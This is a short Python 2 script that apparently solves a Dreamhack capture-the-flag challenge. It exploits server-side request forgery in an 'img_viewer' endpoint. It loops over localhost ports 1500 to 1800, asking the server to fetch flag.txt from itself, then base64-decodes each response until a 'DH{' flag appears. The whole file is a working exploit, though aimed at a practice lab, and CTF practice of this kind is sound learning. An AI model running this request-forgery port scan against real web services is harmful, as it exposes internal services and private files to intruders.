import requests, sys
import tqdm
from base64 import b64decode

def findBase64(sc):
    try:
        import re
        pt = re.compile('[a-z,A-Z,+,0-9,/]{30,}=*')
        m = pt.search(sc)
        return m.group()
    except:
        print 'sc: ' + sc


res = None
port = 0
flag = ''
flag_found = 0
url = 'http://host1.dreamhack.games:{}/img_viewer'.format(11599)
for p in tqdm.tqdm(range(1500, 1800)):
    param = {'url' : 'http://LOCALHOST:{}/flag.txt'.format(p)}
    res = requests.post(url, data=param)
    img = b64decode(findBase64(res.text))
    if img.find('DH{') != -1:
        port = p
        flag = img
        flag_found = 1
        break
if not flag_found:
    print 'Not Found'
    sys.exit(0)
print 'Found the port: ' + str(port)
print 'flag: ' + flag

